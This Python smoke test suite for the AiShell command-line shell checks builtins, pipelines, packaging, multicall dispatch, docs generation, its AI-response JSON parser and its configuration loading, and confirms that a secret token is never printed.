#!/usr/bin/env python3
"""Smoke test suite for AiShell.  Stdlib only — no external dependencies.

Run from the project root:
    python3 tests/smoke_test.py
    python3 tests/smoke_test.py --verbose
"""

import glob
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

TIMEOUT = 5   # seconds per invocation
VERBOSE = "--verbose" in sys.argv or "-v" in sys.argv
ROOT    = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BINARY  = os.path.join(ROOT, "aishell")

# ---------------------------------------------------------------------------
# Result accumulator
# ---------------------------------------------------------------------------

_results = []   # list of (test_id, description, passed, detail_str)


def _record(test_id, description, passed, detail=""):
    _results.append((test_id, description, passed, detail))
    if not passed or VERBOSE:
        label = "[PASS]" if passed else "[FAIL]"
        print(f"{label} {test_id:<38}  {description}")
        if not passed and detail:
            for line in detail.splitlines():
                print(f"       {line}")


# ---------------------------------------------------------------------------
# Command runner
# ---------------------------------------------------------------------------

class _R:
    """Thin wrapper around subprocess result so timeout looks the same."""
    __slots__ = ("returncode", "stdout", "stderr", "timed_out")

    def __init__(self, rc, out, err, timed_out=False):
        self.returncode = rc
        self.stdout     = out
        self.stderr     = err
        self.timed_out  = timed_out


def _run(args, cwd=None, stdin_text=None, env=None):
    try:
        r = subprocess.run(
            args,
            input=stdin_text,
            capture_output=True,
            text=True,
            timeout=TIMEOUT,
            cwd=cwd or ROOT,
            env=env,
        )
        return _R(r.returncode, r.stdout, r.stderr)
    except subprocess.TimeoutExpired:
        return _R(-1, "", f"<timed out after {TIMEOUT}s>", timed_out=True)


def run_interactive(stdin_text, env=None, timeout=None):
    """Run aishell REPL with stdin_text piped in; returns a result object.

    When env is None, a safe default environment is built that strips any
    AISHELL_* vars inherited from the parent process AND explicitly sets the
    mock backend + MCP disabled.  This ensures tests are not broken by a
    real .env file that the user may have placed in the project root (which
    aishell loads from CWD; process env vars take precedence over .env).
    Callers that need specific settings should pass an explicit env dict.

    timeout overrides the module-level TIMEOUT constant for a single call.
    Use this for tests that require a slow mock script (e.g. heartbeat test).
    """
    if env is None:
        env = {k: v for k, v in os.environ.items() if not k.startswith("AISHELL_")}
        env["AISHELL_AI_BACKEND"]  = "mock"
        env["AISHELL_MCP_ENABLED"] = "0"
    t = timeout if timeout is not None else TIMEOUT
    try:
        r = subprocess.run(
            [BINARY],
            input=stdin_text,
            capture_output=True,
            text=True,
            timeout=t,
            cwd=ROOT,
            env=env,
        )
        return _R(r.returncode, r.stdout, r.stderr)
    except subprocess.TimeoutExpired:
        return _R(-1, "", f"<timed out after {t}s>", timed_out=True)


def _fmt(args, r, extra=""):
    """Format a command result into a multi-line debug string."""
    lines = []
    if extra:
        lines.append(extra)
    timeout_note = "  (timed out)" if r.timed_out else ""
    lines += [
        f"cmd:    {' '.join(str(a) for a in args)}",
        f"exit:   {r.returncode}{timeout_note}",
        f"stdout: {r.stdout[:300]!r}",
        f"stderr: {r.stderr[:200]!r}",
    ]
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Section B — Build
# ---------------------------------------------------------------------------

def section_build():
    print("\n--- Section B: Build ---")

    # make clean first; ignore its exit code
    subprocess.run(["make", "clean"], capture_output=True, cwd=ROOT)

    r = _run(["make"])
    ok = (r.returncode == 0
          and os.path.isfile(BINARY)
          and os.access(BINARY, os.X_OK))
    if not ok:
        reason = ("make failed"
                  if r.returncode != 0
                  else "binary missing or not executable after make")
        _record("B001", "make clean && make", False, _fmt(["make"], r, reason))
    else:
        _record("B001", "make clean && make", True)
    return ok


# ---------------------------------------------------------------------------
# Discovery — parse registry_add() calls from src/builtins/*.c
# ---------------------------------------------------------------------------

_REGISTRY_RE = re.compile(r'registry_add\s*\(\s*"([^"]+)"')


def discover_commands():
    """Return every command name registered via registry_add, in source order."""
    commands = []
    for path in sorted(glob.glob(os.path.join(ROOT, "src", "builtins", "*.c"))):
        with open(path) as fh:
            for name in _REGISTRY_RE.findall(fh.read()):
                if name not in commands:
                    commands.append(name)
    return commands


# ---------------------------------------------------------------------------
# Section H — Help / JSON for every discovered builtin
# ---------------------------------------------------------------------------

def _check_help(cmd, suffix, test_id, desc):
    args = ["./aishell", cmd] + suffix
    r = _run(args)

    if r.timed_out:
        _record(test_id, desc, False, _fmt(args, r, "timed out"))
        return

    if "--json" in suffix:
        # Must exit 0 and stdout must be parseable JSON
        if r.returncode != 0:
            _record(test_id, desc, False,
                    _fmt(args, r, "expected exit 0"))
            return
        try:
            json.loads(r.stdout)
            _record(test_id, desc, True)
        except json.JSONDecodeError as exc:
            _record(test_id, desc, False,
                    _fmt(args, r, f"json.loads failed: {exc}"))
    else:
        # Must exit 0 and produce non-empty stdout
        ok = r.returncode == 0 and bool(r.stdout.strip())
        _record(test_id, desc, ok,
                "" if ok else _fmt(args, r,
                                   "expected exit 0 and non-empty stdout"))


def section_help(commands):
    n = len(commands)
    print(f"\n--- Section H: Help/JSON per builtin "
          f"({n} commands, {n * 3} tests) ---")
    for cmd in commands:
        _check_help(cmd, ["-h"],               f"H:{cmd}:-h",          f"{cmd}  -h")
        _check_help(cmd, ["-h", "--json"],     f"H:{cmd}:-h-json",     f"{cmd}  -h --json")
        _check_help(cmd, ["--help", "--json"], f"H:{cmd}:--help-json", f"{cmd}  --help --json")


# ---------------------------------------------------------------------------
# Section F — Functional smoke tests
# ---------------------------------------------------------------------------

def section_functional():
    print("\n--- Section F: Functional smoke tests ---")

    def chk(test_id, args, *,
            exit0=True, exit_nonzero=False, no_crash=False,
            contains=None,
            json_valid=False, json_key=None, json_list=False):
        """Run ./aishell <args> and check the outcome."""
        full = ["./aishell"] + list(args)
        r    = _run(full)
        problems = []

        if r.timed_out:
            problems.append(f"timed out after {TIMEOUT}s")
        else:
            # Exit-code expectations
            if no_crash:
                # Should fail, but not via a signal (no segfault, etc.)
                if r.returncode == 0:
                    problems.append("expected non-zero exit, got 0")
                elif r.returncode < 0:
                    problems.append(
                        f"process killed by signal (returncode={r.returncode})")
            elif exit_nonzero:
                if r.returncode == 0:
                    problems.append("expected non-zero exit, got 0")
            elif exit0:
                if r.returncode != 0:
                    problems.append(f"expected exit 0, got {r.returncode}")

            # Content expectations
            if contains is not None and contains not in r.stdout:
                problems.append(f"stdout missing {contains!r}")

            # JSON expectations
            if json_valid or json_key is not None or json_list:
                try:
                    obj = json.loads(r.stdout)
                    if json_key is not None and json_key not in obj:
                        problems.append(f"JSON missing key {json_key!r}")
                    if json_list and not isinstance(obj, list):
                        problems.append(
                            f"expected JSON array, got {type(obj).__name__}")
                except json.JSONDecodeError as exc:
                    problems.append(f"json.loads: {exc}")

        ok   = not problems
        desc = " ".join(str(a) for a in args)
        _record(test_id, desc, ok,
                "" if ok else _fmt(full, r, "; ".join(problems)))
        return r

    # --- hand-picked functional cases ---

    chk("F001", ["echo", "hello", "world"],   contains="hello world")

    # F002: pwd must return an existing directory path
    r02  = _run(["./aishell", "pwd"])
    path = r02.stdout.strip()
    ok02 = (not r02.timed_out
            and r02.returncode == 0
            and bool(path)
            and os.path.isdir(path))
    _record("F002", "pwd  (output is an existing directory)", ok02,
            "" if ok02 else _fmt(
                ["./aishell", "pwd"], r02,
                f"expected exit 0 and an existing directory path, got {path!r}"))

    chk("F003", ["true"])
    chk("F004", ["false"],                    exit_nonzero=True)
    chk("F005", ["ls", "."],                  contains="Makefile")
    chk("F006", ["pwd", "--json"],            json_key="cwd")
    chk("F007", ["echo", "hi", "--json"],     json_valid=True)

    # F008: unknown command must fail without crashing (no signal)
    chk("F008", ["nonexistent_xyz_cmd"],      no_crash=True)

    chk("F009", ["help"],                     contains="Commands:")
    chk("F010", ["help", "ls"],               contains="ls")
    chk("F011", ["jobs"])                          # empty list is fine
    chk("F012", ["ps"],                       contains="aishell")
    chk("F013", ["date"])
    chk("F014", ["stat", "Makefile"],         contains="Makefile")
    chk("F015", ["cat", "Makefile"])
    chk("F016", ["ls", "--json", "."],        json_list=True)

    # F023: head with a file argument returns the first N lines
    chk("F023", ["head", "-n", "3", "README.md"], contains="AiShell")

    # F024: tail with a file argument returns lines from a file
    chk("F024", ["tail", "-n", "3", "README.md"])

    # F025: head reads stdin when FILE is omitted (pipeline via REPL)
    env_no_ai = {k: v for k, v in os.environ.items()
                 if not k.startswith("AISHELL_")}
    env_no_ai["AISHELL_AI_BACKEND"]  = "mock"
    env_no_ai["AISHELL_MCP_ENABLED"] = "0"
    r25 = run_interactive("cat README.md | head -n 2\n", env=env_no_ai)
    ok25 = (not r25.timed_out
            and r25.returncode == 0
            and "AiShell" in r25.stdout)
    _record("F025", "head reads stdin in pipeline (cat README.md | head -n 2)",
            ok25, "" if ok25 else f"stdout={r25.stdout!r} stderr={r25.stderr!r}")

    # F026: tail reads stdin when FILE is omitted (pipeline via REPL)
    r26 = run_interactive("cat README.md | tail -n 2\n", env=env_no_ai)
    ok26 = (not r26.timed_out and r26.returncode == 0 and r26.stdout.strip() != "")
    _record("F026", "tail reads stdin in pipeline (cat README.md | tail -n 2)",
            ok26, "" if ok26 else f"stdout={r26.stdout!r} stderr={r26.stderr!r}")

    # F027: head --json with stdin path shows "-"
    r27 = run_interactive("cat README.md | head -n 1 --json\n", env=env_no_ai)
    ok27 = (not r27.timed_out
            and r27.returncode == 0
            and '"path":"-"' in r27.stdout.replace(" ", ""))
    _record("F027", "head --json stdin: path field is \"-\"",
            ok27, "" if ok27 else f"stdout={r27.stdout!r}")

    # F028-F032: single-quote literal pass-through (no $VAR expansion inside '')

    env_sq = {k: v for k, v in os.environ.items()
              if not k.startswith("AISHELL_")}
    env_sq["AISHELL_AI_BACKEND"]  = "mock"
    env_sq["AISHELL_MCP_ENABLED"] = "0"
    env_sq["SQ_TEST_VAR"]         = "EXPANDED"  # must NOT appear in sq tests

    # F028: echo '$HOME' prints the literal string $HOME, not the env value
    r28 = run_interactive("echo '$HOME'\n", env=env_sq)
    home_val = env_sq.get("HOME", "/home/user")
    ok28 = (not r28.timed_out
            and r28.returncode == 0
            and "$HOME" in r28.stdout          # literal present
            and home_val not in r28.stdout)    # expanded value absent
    _record("F028", "echo '$HOME' → literal $HOME (single-quote suppresses expansion)",
            ok28, "" if ok28 else f"stdout={r28.stdout!r}")

    # F029: echo $SQ_TEST_VAR (unquoted) → expansion still works
    r29 = run_interactive("echo $SQ_TEST_VAR\n", env=env_sq)
    ok29 = (not r29.timed_out
            and r29.returncode == 0
            and "EXPANDED" in r29.stdout)
    _record("F029", "echo $SQ_TEST_VAR (unquoted) → value still expanded",
            ok29, "" if ok29 else f"stdout={r29.stdout!r}")

    # F030: awk with $2 in single-quoted program — $2 must reach awk intact
    # echo "a/b/c" | awk -F/ '{print $2}' should output "b"
    r30 = run_interactive("echo 'a/b/c' | awk -F/ '{print $2}'\n", env=env_sq)
    # The awk output is appended right after the "aishell> " prompt in captured
    # stdout.  Strip prompt prefixes inline, then check for "b" in remaining text.
    stripped30 = r30.stdout.replace("aishell> ", "").replace("Welcome to AiShell. "
                 "Type help, -h, or --help for usage.", "")
    ok30 = (not r30.timed_out
            and r30.returncode == 0
            and "b" in stripped30.split())
    _record("F030", "awk -F/ '{print $2}' in pipeline → $2 reaches awk (not empty)",
            ok30, "" if ok30 else f"stdout={r30.stdout!r} stderr={r30.stderr!r}")

    # F031: the real failing command from the issue — should not produce {count[]++}
    real_cmd = ("find src -name '*.c' | "
                "awk -F/ '{count[$2]++} END{for(d in count) print count[d], d}'")
    r31 = run_interactive(real_cmd + "\n", env=env_sq)
    # Check: awk ran without syntax error (stderr should not mention count[])
    ok31 = (not r31.timed_out
            and "count[]" not in r31.stderr
            and "syntax error" not in r31.stderr.lower())
    _record("F031", "find|awk -F/ pipeline: $2 in single-quoted awk program not expanded",
            ok31, "" if ok31 else f"stderr={r31.stderr!r}")

    # F017: pkg with no subcommand exits 0 and prints usage
    chk("F017", ["pkg"],                      contains="build")

    # F018: --commands-json emits a valid JSON array
    chk("F018", ["--commands-json"],          json_list=True)

    # F019-F022: pkg subcommand lifecycle
    _section_pkg(chk)


def _section_pkg(chk):
    """Build, install, list, info, remove a toy package end-to-end."""
    import tempfile as _tmp

    # Create a toy package source tree
    srcdir = _tmp.mkdtemp(prefix="aishell_pkg_src_")
    bindir = os.path.join(srcdir, "bin")
    os.makedirs(bindir, exist_ok=True)
    hello  = os.path.join(bindir, "hello")
    with open(hello, "w") as f:
        f.write("#!/bin/sh\necho 'hello from pkg'\n")
    os.chmod(hello, 0o755)
    pkgjson = os.path.join(srcdir, "pkg.json")
    with open(pkgjson, "w") as f:
        f.write('{"name":"smoke_hello","version":"0.0.1",'
                '"description":"Smoke test pkg","files":["bin/hello"],"docs":[]}\n')

    tarball = os.path.join(_tmp.gettempdir(), "smoke_hello-0.0.1.tar.gz")

    try:
        # F019: pkg build
        r19 = _run(["./aishell", "pkg", "build", srcdir, tarball])
        ok19 = r19.returncode == 0 and os.path.isfile(tarball)
        _record("F019", "pkg build (creates tarball)",
                ok19, "" if ok19 else _fmt(
                    ["./aishell", "pkg", "build", srcdir, tarball], r19,
                    "expected exit 0 and tarball to exist"))

        if not ok19:
            for tid in ("F020", "F021", "F022"):
                _record(tid, f"pkg lifecycle (skipped: build failed)", False, "F019 failed")
            return

        # F020: pkg install then list --json
        _run(["./aishell", "pkg", "remove", "smoke_hello"])   # clean slate
        ri = _run(["./aishell", "pkg", "install", tarball])
        rl = _run(["./aishell", "pkg", "list", "--json"])
        problems = []
        if ri.returncode != 0:
            problems.append(f"install exit {ri.returncode}")
        if rl.returncode != 0:
            problems.append(f"list exit {rl.returncode}")
        else:
            try:
                lst = json.loads(rl.stdout)
                if not isinstance(lst, list):
                    problems.append("list --json not an array")
                elif not any(e.get("name") == "smoke_hello" for e in lst):
                    problems.append("smoke_hello not in list output")
            except json.JSONDecodeError as e:
                problems.append(f"list json.loads: {e}")
        _record("F020", "pkg install + list --json",
                not problems, "" if not problems else "; ".join(problems))

        # F021: pkg info --json
        ri2 = _run(["./aishell", "pkg", "info", "smoke_hello", "--json"])
        ok21 = ri2.returncode == 0
        if ok21:
            try:
                obj = json.loads(ri2.stdout)
                if obj.get("name") != "smoke_hello":
                    ok21 = False
                    problems21 = "name mismatch in info json"
                else:
                    problems21 = ""
            except json.JSONDecodeError as e:
                ok21 = False
                problems21 = f"json.loads: {e}"
        else:
            problems21 = f"exit {ri2.returncode}"
        _record("F021", "pkg info --json",
                ok21, "" if ok21 else _fmt(
                    ["./aishell", "pkg", "info", "smoke_hello", "--json"], ri2, problems21))

        # F022: pkg remove --json
        rr = _run(["./aishell", "pkg", "remove", "smoke_hello", "--json"])
        ok22 = rr.returncode == 0
        if ok22:
            try:
                obj = json.loads(rr.stdout)
                if obj.get("status") != "removed":
                    ok22 = False
                    problems22 = f"status not 'removed': {obj}"
                else:
                    problems22 = ""
            except json.JSONDecodeError as e:
                ok22 = False
                problems22 = f"json.loads: {e}"
        else:
            problems22 = f"exit {rr.returncode}"
        _record("F022", "pkg remove --json",
                ok22, "" if ok22 else _fmt(
                    ["./aishell", "pkg", "remove", "smoke_hello", "--json"], rr, problems22))

    finally:
        shutil.rmtree(srcdir, ignore_errors=True)
        try:
            os.unlink(tarball)
        except OSError:
            pass


# ---------------------------------------------------------------------------
# Section M — Multicall dispatch via symlinks
# ---------------------------------------------------------------------------

def section_multicall():
    print("\n--- Section M: Multicall dispatch ---")
    tmpdir = tempfile.mkdtemp(prefix="aishell_smoke_")
    try:
        def mchk(test_id, cmd, args, *,
                 exit0=True, exit_nonzero=False,
                 contains=None, is_dir_out=False):
            link = os.path.join(tmpdir, cmd)
            os.symlink(BINARY, link)
            full = [link] + list(args)
            r    = _run(full)
            problems = []

            if r.timed_out:
                problems.append(f"timed out after {TIMEOUT}s")
            else:
                if exit_nonzero:
                    if r.returncode == 0:
                        problems.append("expected non-zero exit, got 0")
                elif exit0:
                    if r.returncode != 0:
                        problems.append(f"expected exit 0, got {r.returncode}")
                if contains is not None and contains not in r.stdout:
                    problems.append(f"stdout missing {contains!r}")
                if is_dir_out:
                    p = r.stdout.strip()
                    if not p or not os.path.isdir(p):
                        problems.append(
                            f"stdout {p!r} is not an existing directory")

            ok   = not problems
            desc = f"multicall {cmd}" + (f"  {' '.join(args)}" if args else "")
            _record(test_id, desc, ok,
                    "" if ok else _fmt(full, r, "; ".join(problems)))

        mchk("M001", "echo",  ["hi"],   contains="hi")
        mchk("M002", "pwd",   [],        is_dir_out=True)
        mchk("M003", "true",  [],        exit0=True)
        mchk("M004", "false", [],        exit_nonzero=True)

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ---------------------------------------------------------------------------
# Section D — Docs generation
# ---------------------------------------------------------------------------

def section_docs():
    print("\n--- Section D: Docs generation ---")
    import tempfile as _tmp
    tmpdir = _tmp.mkdtemp(prefix="aishell_docs_")
    try:
        r = _run(["./aishell", "--gen-docs", tmpdir])
        files = os.listdir(tmpdir) if r.returncode == 0 else []
        expected = {"pkg.md", "pkg-build.md", "pkg-install.md",
                    "pkg-list.md", "pkg-info.md", "pkg-remove.md"}
        missing = expected - set(files)
        ok = r.returncode == 0 and not missing
        _record("D001", "--gen-docs generates pkg*.md files",
                ok, "" if ok else _fmt(
                    ["./aishell", "--gen-docs", tmpdir], r,
                    f"missing files: {missing}" if missing else "non-zero exit"))

        # D002: multicall guard — symlink as 'echo', pass --commands-json
        # should run echo (prints nothing useful), NOT emit catalog
        import tempfile as _tmp2
        ldir = _tmp2.mkdtemp(prefix="aishell_guard_")
        try:
            link = os.path.join(ldir, "echo")
            os.symlink(BINARY, link)
            r2 = _run([link, "--commands-json"])
            # echo with --commands-json arg: argtable3 will reject it (unknown flag)
            # what matters is it does NOT emit a JSON array starting with '['
            guard_ok = not r2.stdout.strip().startswith("[")
            _record("D002", "multicall guard: echo --commands-json doesn't emit catalog",
                    guard_ok, "" if guard_ok else
                    f"stdout starts with '[', suggesting catalog was emitted:\n{r2.stdout[:200]!r}")
        finally:
            shutil.rmtree(ldir, ignore_errors=True)

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ---------------------------------------------------------------------------
# Section JP — AI JSON parser (Phase 3)
# ---------------------------------------------------------------------------

def section_json_parse():
    print("\n--- Section JP: AI JSON parser ---")

    VALID = ('{"command":"pwd",'
             '"explanation":"Prints the current working directory.",'
             '"risk":"read_only",'
             '"confidence":0.95}')

    def jp(test_id, input_json, *, expect_ok=True,
           expect_key=None, expect_val=None, expect_error_code=None):
        r = _run(["./aishell", "--parse-ai-json"], stdin_text=input_json)
        if r.timed_out:
            _record(test_id, f"--parse-ai-json {input_json[:50]!r}",
                    False, "timed out")
            return
        try:
            obj = json.loads(r.stdout)
        except json.JSONDecodeError as exc:
            _record(test_id, f"--parse-ai-json {input_json[:50]!r}",
                    False, f"output not valid JSON: {exc}\nstdout: {r.stdout!r}")
            return

        if expect_ok:
            ok = obj.get("status") == "ok"
            if ok and expect_key is not None and expect_val is not None:
                ok = obj.get(expect_key) == expect_val
        else:
            ok = obj.get("status") == "error"
            if ok and expect_error_code is not None:
                ok = obj.get("error_code") == expect_error_code

        desc = f"--parse-ai-json {input_json[:60]!r}"
        _record(test_id, desc, ok,
                "" if ok else f"response: {r.stdout!r}")

    # JP001: valid JSON → ok, correct command extracted
    jp("JP001", VALID, expect_ok=True, expect_key="command", expect_val="pwd")

    # JP002: valid JSON → correct risk extracted
    jp("JP002", VALID, expect_ok=True, expect_key="risk", expect_val="read_only")

    # JP003: not JSON at all → parse_error
    jp("JP003", "not json at all",
       expect_ok=False, expect_error_code="parse_error")

    # JP004: missing command field → missing_field
    jp("JP004",
       '{"explanation":"x","risk":"read_only","confidence":0.9}',
       expect_ok=False, expect_error_code="missing_field")

    # JP005: empty command → invalid_field
    jp("JP005",
       '{"command":"","explanation":"x","risk":"read_only","confidence":0.9}',
       expect_ok=False, expect_error_code="invalid_field")

    # JP006: missing explanation → missing_field
    jp("JP006",
       '{"command":"pwd","risk":"read_only","confidence":0.9}',
       expect_ok=False, expect_error_code="missing_field")

    # JP007: empty explanation → invalid_field
    jp("JP007",
       '{"command":"pwd","explanation":"","risk":"read_only","confidence":0.9}',
       expect_ok=False, expect_error_code="invalid_field")

    # JP008: invalid risk value → invalid_field
    jp("JP008",
       '{"command":"pwd","explanation":"x","risk":"dangerous","confidence":0.9}',
       expect_ok=False, expect_error_code="invalid_field")

    # JP009: confidence below 0 → invalid_field
    jp("JP009",
       '{"command":"pwd","explanation":"x","risk":"read_only","confidence":-0.1}',
       expect_ok=False, expect_error_code="invalid_field")

    # JP010: confidence above 1 → invalid_field
    jp("JP010",
       '{"command":"pwd","explanation":"x","risk":"read_only","confidence":1.1}',
       expect_ok=False, expect_error_code="invalid_field")

    # JP011: extra unknown fields are ignored
    jp("JP011",
       ('{"command":"ls","explanation":"Lists files.","risk":"read_only",'
        '"confidence":0.8,"extra":"ignored","alternatives":[]}'),
       expect_ok=True, expect_key="command", expect_val="ls")

    # JP012: whitespace and newlines around the JSON object are accepted
    jp("JP012",
       '  \n  {"command":"date","explanation":"Show date.","risk":"read_only",'
       '"confidence":1.0}  \n  ',
       expect_ok=True, expect_key="command", expect_val="date")

    # JP013: long command string (>512 bytes) → truncated
    long_cmd = "x" * 600
    jp("JP013",
       f'{{"command":"{long_cmd}","explanation":"x","risk":"read_only","confidence":0.5}}',
       expect_ok=False, expect_error_code="truncated")

    # JP014a-e: all five valid risk values are accepted
    for suffix, risk in [("a", "read_only"), ("b", "write"),
                          ("c", "destructive"), ("d", "network"), ("e", "unknown")]:
        jp(f"JP014{suffix}",
           f'{{"command":"pwd","explanation":"x","risk":"{risk}","confidence":0.5}}',
           expect_ok=True, expect_key="risk", expect_val=risk)

    # JP015: missing risk field → missing_field
    jp("JP015",
       '{"command":"pwd","explanation":"x","confidence":0.9}',
       expect_ok=False, expect_error_code="missing_field")

    # JP016: missing confidence field → missing_field
    jp("JP016",
       '{"command":"pwd","explanation":"x","risk":"read_only"}',
       expect_ok=False, expect_error_code="missing_field")

    # JP017: confidence exactly 0.0 is valid
    jp("JP017",
       '{"command":"pwd","explanation":"x","risk":"read_only","confidence":0.0}',
       expect_ok=True)

    # JP018: confidence exactly 1.0 is valid
    jp("JP018",
       '{"command":"pwd","explanation":"x","risk":"read_only","confidence":1.0}',
       expect_ok=True)

    # -- Code-fence stripping tests (Phase 9 bug fix) -------------------------
    # Valid fenced JSON base (shared by JP019, JP020, JP021, JP023)
    _fenced_inner = ('{"command":"ls -la",'
                     '"explanation":"Lists files with details.",'
                     '"risk":"read_only","confidence":0.95}')

    # JP019: ```json fence is stripped and parsed successfully
    jp("JP019",
       '```json\n' + _fenced_inner + '\n```',
       expect_ok=True, expect_key="command", expect_val="ls -la")

    # JP020: plain ``` fence (no language tag) is also stripped
    jp("JP020",
       '```\n' + _fenced_inner + '\n```',
       expect_ok=True, expect_key="command", expect_val="ls -la")

    # JP021: surrounding whitespace + fenced JSON still parses
    jp("JP021",
       '  \n```json\n\n' + _fenced_inner + '\n\n```\n  ',
       expect_ok=True, expect_key="command", expect_val="ls -la")

    # JP022: fenced but malformed inner content → parse_error
    jp("JP022",
       '```json\nnot valid json here\n```',
       expect_ok=False, expect_error_code="parse_error")

    # JP023: fenced JSON without closing fence → still parsed
    jp("JP023",
       '```json\n' + _fenced_inner,
       expect_ok=True, expect_key="risk", expect_val="read_only")

    # -- Intent field tests (out-of-scope guard) --------------------------------

    _valid5 = ('{"intent":"shell_command","command":"pwd",'
               '"explanation":"Prints the working directory.",'
               '"risk":"read_only","confidence":0.95}')
    _unsup  = ('{"intent":"unsupported","command":"",'
               '"explanation":"This is not a shell command task.",'
               '"risk":"unknown","confidence":1.0}')

    # JP024: explicit intent "shell_command" → ok, intent extracted correctly
    jp("JP024", _valid5, expect_ok=True, expect_key="intent", expect_val="shell_command")

    # JP025: no intent field (backward compat) → ok, defaults to "shell_command"
    jp("JP025", VALID, expect_ok=True, expect_key="intent", expect_val="shell_command")

    # JP026: intent "unsupported" with empty command → ok
    jp("JP026", _unsup, expect_ok=True, expect_key="intent", expect_val="unsupported")

    # JP027: invalid intent value → invalid_field
    jp("JP027",
       '{"intent":"creative_writing","command":"pwd","explanation":"x","risk":"read_only","confidence":0.9}',
       expect_ok=False, expect_error_code="invalid_field")


# ---------------------------------------------------------------------------
# Section CFG — configuration loading (Phase 2)
# ---------------------------------------------------------------------------

def section_config():
    print("\n--- Section CFG: configuration loading ---")

    def cfg_run(env_extra=None, env_file_content=None):
        """Run aishell --dump-config from a temp dir with a clean environment."""
        tmpdir = tempfile.mkdtemp(prefix="aishell_cfg_")
        try:
            if env_file_content is not None:
                with open(os.path.join(tmpdir, ".env"), "w") as f:
                    f.write(env_file_content)

            # Start from the real environment, remove any AISHELL_* vars,
            # then apply the caller-supplied overrides.
            env = {k: v for k, v in os.environ.items()
                   if not k.startswith("AISHELL_")}
            if env_extra:
                env.update(env_extra)

            r = subprocess.run(
                [BINARY, "--dump-config"],
                capture_output=True,
                text=True,
                timeout=TIMEOUT,
                cwd=tmpdir,
                env=env,
            )
            return _R(r.returncode, r.stdout, r.stderr)
        except subprocess.TimeoutExpired:
            return _R(-1, "", f"<timed out after {TIMEOUT}s>", timed_out=True)
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    def cfgchk(test_id, desc, r, key, expected):
        if r.timed_out:
            _record(test_id, desc, False, "timed out")
            return
        try:
            obj = json.loads(r.stdout)
        except json.JSONDecodeError as exc:
            _record(test_id, desc, False,
                    f"json.loads: {exc}\nstdout: {r.stdout[:200]!r}")
            return
        actual = obj.get(key)
        ok = (actual == expected)
        _record(test_id, desc, ok,
                "" if ok else f"{key!r}: expected {expected!r}, got {actual!r}")

    # CFG001 — defaults when no .env and no AISHELL_* env vars
    r_def = cfg_run()
    cfgchk("CFG001a", "default: claude_path is empty",         r_def, "claude_path",         "")
    cfgchk("CFG001b", "default: mcp_enabled=0",                r_def, "mcp_enabled",         0)
    cfgchk("CFG001c", "default: mcp_host=127.0.0.1",           r_def, "mcp_host",            "127.0.0.1")
    cfgchk("CFG001d", "default: mcp_port=0",                   r_def, "mcp_port",            0)
    cfgchk("CFG001e", "default: mcp_token_set=false",          r_def, "mcp_token_set",       False)
    cfgchk("CFG001f", "default: ai_timeout_ms=30000",          r_def, "ai_timeout_ms",       30000)
    cfgchk("CFG001g", "default: ai_max_retries=6",             r_def, "ai_max_retries",      6)
    cfgchk("CFG001h", "default: ai_retry_backoff_ms=500",      r_def, "ai_retry_backoff_ms", 500)
    cfgchk("CFG001i", "default: mcp_tool_timeout_ms=10000",    r_def, "mcp_tool_timeout_ms", 10000)

    # CFG002 — environment variables override defaults
    r = cfg_run(env_extra={
        "AISHELL_AI_TIMEOUT_MS":  "9999",
        "AISHELL_AI_MAX_RETRIES": "3",
        "AISHELL_MCP_HOST":       "127.0.0.2",
        "AISHELL_MCP_ENABLED":    "1",
    })
    cfgchk("CFG002a", "env: ai_timeout_ms=9999",  r, "ai_timeout_ms",  9999)
    cfgchk("CFG002b", "env: ai_max_retries=3",    r, "ai_max_retries", 3)
    cfgchk("CFG002c", "env: mcp_host=127.0.0.2",  r, "mcp_host",       "127.0.0.2")
    cfgchk("CFG002d", "env: mcp_enabled=1",        r, "mcp_enabled",    1)

    # CFG003 — .env file values are parsed
    r = cfg_run(env_file_content=(
        "AISHELL_AI_MAX_RETRIES=4\n"
        "AISHELL_MCP_PORT=8765\n"
    ))
    cfgchk("CFG003a", ".env: ai_max_retries=4", r, "ai_max_retries", 4)
    cfgchk("CFG003b", ".env: mcp_port=8765",    r, "mcp_port",       8765)

    # CFG004 — environment variables override .env values
    r = cfg_run(
        env_extra={"AISHELL_AI_MAX_RETRIES": "10"},
        env_file_content="AISHELL_AI_MAX_RETRIES=2\n",
    )
    cfgchk("CFG004", "env overrides .env: ai_max_retries=10 (not 2)",
           r, "ai_max_retries", 10)

    # CFG005 — comments, blank lines, and non-AISHELL_ keys are ignored
    r = cfg_run(env_file_content=(
        "# this is a comment\n"
        "\n"
        "AISHELL_AI_MAX_RETRIES=7\n"
        "NOT_AISHELL_VAR=ignored\n"
    ))
    cfgchk("CFG005a", ".env: valid AISHELL_ line parsed (retries=7)",
           r, "ai_max_retries", 7)
    cfgchk("CFG005b", ".env: non-AISHELL_ key ignored (timeout stays at default)",
           r, "ai_timeout_ms", 30000)

    # CFG006 — invalid integer falls back to default without crashing
    r = cfg_run(env_extra={"AISHELL_AI_MAX_RETRIES": "notanumber"})
    cfgchk("CFG006", "invalid int env var falls back to default (6)",
           r, "ai_max_retries", 6)

    # CFG001j — default: ai_backend=mock
    cfgchk("CFG001j", "default: ai_backend=mock", r_def, "ai_backend", "mock")

    # CFG008 — invalid backend falls back to mock without crashing
    r_inv = cfg_run(env_extra={"AISHELL_AI_BACKEND": "garbage_value"})
    cfgchk("CFG008", "invalid AISHELL_AI_BACKEND falls back to 'mock'",
           r_inv, "ai_backend", "mock")

    # CFG007 — token value is never printed; mcp_token_set reflects presence
    r = cfg_run(env_extra={"AISHELL_MCP_TOKEN": "super-secret-xyz-789"})
    if r.timed_out:
        _record("CFG007", "token not exposed in output", False, "timed out")
    else:
        secret  = "super-secret-xyz-789"
        exposed = secret in r.stdout or secret in r.stderr
        try:
            obj      = json.loads(r.stdout)
            tok_set  = obj.get("mcp_token_set") is True
        except json.JSONDecodeError:
            tok_set = False
        ok = (not exposed) and tok_set
        _record("CFG007",
                "token value not in output; mcp_token_set=true when token present",
                ok,
                "" if ok else (
                    "token value exposed in output" if exposed
                    else f"mcp_token_set not true; stdout: {r.stdout[:200]!r}"
                ))


# ---------------------------------------------------------------------------
# Section AT — @ natural-language command mode (Phase 1 mock)
# ---------------------------------------------------------------------------

